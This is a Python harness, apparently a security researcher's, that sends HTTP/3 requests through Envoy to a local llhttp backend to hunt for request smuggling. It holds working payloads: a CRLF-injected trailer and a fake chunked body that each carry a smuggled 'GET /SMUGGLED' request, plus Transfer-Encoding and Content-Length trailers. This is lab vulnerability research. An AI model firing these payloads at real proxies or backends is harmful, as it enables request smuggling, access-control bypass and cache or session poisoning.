"""Hunt Envoy's H3->H1 chunked re-framing against a real llhttp backend (chunk_bk.js).
Envoy emits transfer-encoding: chunked for a no-CL body. Questions: does it forward H3
trailers as H1 chunked trailers, and can a trailer or a chunked-body edge smuggle a request
or a framing-relevant header past Envoy into the backend? A smuggle = the llhttp backend
frames >1 request from one forwarded stream, or a trailer carries injected framing headers.
SENTINEL FIRST: a benign no-CL body frames exactly 1 request (te=chunked) at the backend."""
import asyncio
import os
import ssl
import sys
import time

sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration

from phage.evo import genome as G
from phage.evo.driver import drive

PORT = 4439
LOG = "logs/chunk_bk.log"


def sz():
    try:
        return os.path.getsize(LOG)
    except OSError:
        return 0


def since(off):
    with open(LOG, "rb") as f:
        f.seek(off)
        return f.read()


async def _fire(genome, raw):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", PORT, configuration=cfg) as client:
        http = H3Connection(client._quic)
        sid = client._quic.get_next_available_stream_id()
        await drive(http, client._quic, sid, genome, transmit=client.transmit, raw=raw)
        await asyncio.sleep(0.3)


def fire(genome, label, raw=True):
    off = sz()
    try:
        asyncio.new_event_loop().run_until_complete(_fire(genome, raw))
    except Exception:
        pass
    time.sleep(0.4)
    out = since(off)
    reqs = [l for l in out.split(b"\n") if l.startswith(b"REQ ")]
    err = [l for l in out.split(b"\n") if l.startswith(b"CLIENTERROR")]
    flag = "  <<< SMUGGLE" if len(reqs) > 1 else ""
    print(f"\n[{label}] backend_reqs={len(reqs)} err={len(err)}{flag}")
    for r in reqs:
        print(f"  {r.decode('latin1')}")
    return len(reqs), out


def hdr(fields, end):
    return G.Headers(tuple(fields), end_stream=end)


REQ = [(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab")]


if __name__ == "__main__":
    # SENTINEL: benign no-CL body -> exactly 1 chunked request framed at the backend.
    n, _ = fire([hdr(REQ + [(b":path", b"/sentinel")], False),
                 G.Data(b"HELLO", end_stream=True)], "SENTINEL no-CL body")
    if n != 1:
        print(f"SENTINEL FAIL ({n} reqs). Chunked oracle not proven. Stop.")
        sys.exit(1)
    print("SENTINEL OK (chunked oracle live).")

    # 1. benign trailer: does Envoy forward an H3 trailer as an H1 chunked trailer?
    fire([hdr(REQ + [(b":path", b"/trailer")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"x-trailer", b"present")], True)], "1 benign trailer")
    # 2. trailer carrying a framing header (Transfer-Encoding) - should be stripped.
    fire([hdr(REQ + [(b":path", b"/tr-te")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"transfer-encoding", b"chunked")], True)], "2 trailer Transfer-Encoding")
    # 3. trailer with CRLF injection (smuggle a request via the trailer value).
    fire([hdr(REQ + [(b":path", b"/tr-crlf")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"x-tr", b"a\r\nGET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n")], True)],
         "3 trailer CRLF injection")
    # 4. trailer named Content-Length (framing confusion on a chunked message).
    fire([hdr(REQ + [(b":path", b"/tr-cl")], False), G.Data(b"HI", end_stream=False),
          hdr([(b"content-length", b"50")], True)], "4 trailer Content-Length")
    # 5. body that itself looks like chunked framing (Envoy wraps it; must stay opaque).
    fire([hdr(REQ + [(b":path", b"/fakechunk")], False),
          G.Data(b"0\r\n\r\nGET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n", end_stream=True)],
         "5 body-looks-chunked")
    print("\nVERDICT: any <<< SMUGGLE = llhttp framed >1 request; check trailer echoes too.")
